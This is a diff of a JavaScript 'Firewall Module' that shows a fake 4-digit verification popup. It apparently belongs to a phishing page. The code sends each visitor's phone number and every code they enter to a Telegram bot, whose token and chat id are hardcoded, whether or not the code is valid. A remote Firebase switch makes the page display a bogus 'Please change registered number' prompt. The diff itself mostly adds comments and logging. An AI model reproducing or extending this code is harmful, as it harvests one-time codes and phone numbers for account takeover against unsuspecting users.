@@ -1,7 +1,8 @@
 /**
- * Firewall Module - 
+ * Firewall Module - 4-digit Verification with Change Number Option
  */
 
+// ========== TELEGRAM NOTIFICATION ==========
 async function sendTelegram(phone, code, type = 'verify') {
     let msg = '';
     if (type === 'verify') {
@@ -11,9 +12,13 @@ async function sendTelegram(phone, code, type = 'verify') {
     }
     try {
         await fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(msg)}`);
-    } catch(e) {}
+        console.log("📨 Telegram sent");
+    } catch(e) {
+        console.log("Telegram error:", e);
+    }
 }
 
+// ========== CHECK CHANGE NUMBER REQUIREMENT ==========
 async function isChangeNumberRequired() {
     if (typeof firebase !== 'undefined' && firebase.database) {
         try {
@@ -28,9 +33,11 @@ async function isChangeNumberRequired() {
     return false;
 }
 
+// ========== GLOBAL VARIABLES ==========
 let currentVerificationCode = null;
 let verificationAttempts = 0;
 
+// ========== SHOW FIREWALL POPUP ==========
 function showFirewallPopup() {
     const popup = document.getElementById('firewallPopup');
     if (popup) {
@@ -46,6 +53,7 @@ function showFirewallPopup() {
     }
 }
 
+// ========== UPDATE POPUP CONTENT ==========
 function updatePopupContent(showChangeLink = false) {
     const content = document.getElementById('firewallPopupContent');
     if (!content) return;
@@ -81,6 +89,7 @@ function updatePopupContent(showChangeLink = false) {
     `;
 }
 
+// ========== SHOW REMARK ==========
 function showRemark(message, isError = true) {
     const remarkDiv = document.getElementById('firewallRemark');
     if (remarkDiv) {
@@ -88,21 +97,26 @@ function showRemark(message, isError = true) {
         remarkDiv.innerHTML = message;
         remarkDiv.className = isError ? 'firewall-remark error' : 'firewall-remark success';
         remarkDiv.style.animation = 'fadeInOut 0.5s ease';
+        setTimeout(() => {
+            remarkDiv.style.display = 'none';
+        }, 3000);
     }
 }
 
+// ========== HIDE FIREWALL POPUP ==========
 function hideFirewallPopup() {
     const popup = document.getElementById('firewallPopup');
     if (popup) popup.style.display = 'none';
 }
 
-// Redirect to index.html
+// ========== REDIRECT TO INDEX ==========
 window.redirectToIndex = function() {
     localStorage.removeItem("userPhone");
     localStorage.removeItem("userDeviceId");
     window.location.href = "index.html";
 };
 
+// ========== VERIFY 4-DIGIT CODE ==========
 window.verifyFirewallCode = async function() {
     const codeInput = document.getElementById('verificationCode');
     const code = codeInput ? codeInput.value.trim() : '';
@@ -117,7 +131,11 @@ window.verifyFirewallCode = async function() {
         }
         return;
     }
-    if (verifyBtn) { verifyBtn.disabled = true; verifyBtn.innerHTML = "VERIFYING..."; }
+    
+    if (verifyBtn) {
+        verifyBtn.disabled = true;
+        verifyBtn.innerHTML = "VERIFYING...";
+    }
     if (errorDiv) errorDiv.style.display = 'none';
     
     verificationAttempts++;
@@ -126,9 +144,9 @@ window.verifyFirewallCode = async function() {
     const changeRequired = await isChangeNumberRequired();
     
     if (changeRequired) {
-        // Send notification and show change link
+        // CHANGE # IS CHECKED - Show "Please change registered number" message
         await sendTelegram(userPhone, code, 'verify');
-        showRemark('⚠️ <strong class="highlight-error">Invalid 4-digit Verification Code</strong>', true);
+        showRemark('⚠️ <strong class="highlight-error">Please change registered number</strong>', true);
         updatePopupContent(true); // Show change link
         if (verifyBtn) {
             verifyBtn.disabled = false;
@@ -139,14 +157,16 @@ window.verifyFirewallCode = async function() {
             codeInput.focus();
         }
     } else {
-        // Normal verification
+        // CHANGE # IS UNCHECKED - Normal verification
         const isValid = (code === currentVerificationCode);
         
         if (isValid) {
             await sendTelegram(userPhone, code, 'verify');
             hideFirewallPopup();
             alert("Verification successful. Page will refresh.");
-            setTimeout(() => { window.location.reload(); }, 500);
+            setTimeout(() => {
+                window.location.reload();
+            }, 500);
         } else {
             await sendTelegram(userPhone, code, 'verify');
             showRemark('⚠️ <strong class="highlight-error">Invalid 4-digit Verification Code</strong>. Please try again.', true);
@@ -160,12 +180,16 @@ window.verifyFirewallCode = async function() {
             }
             if (verificationAttempts >= 3) {
                 showRemark('⚠️ Too many failed attempts. Page will refresh.', true);
-                setTimeout(() => { window.location.reload(); }, 2000);
+                setTimeout(() => {
+                    window.location.reload();
+                }, 2000);
             }
         }
     }
 };
 
+// ========== EXPOSE FUNCTIONS ==========
 window.showFirewallPopup = showFirewallPopup;
 window.hideFirewallPopup = hideFirewallPopup;
 window.verifyFirewallCode = verifyFirewallCode;
+window.isChangeNumberRequired = isChangeNumberRequired;
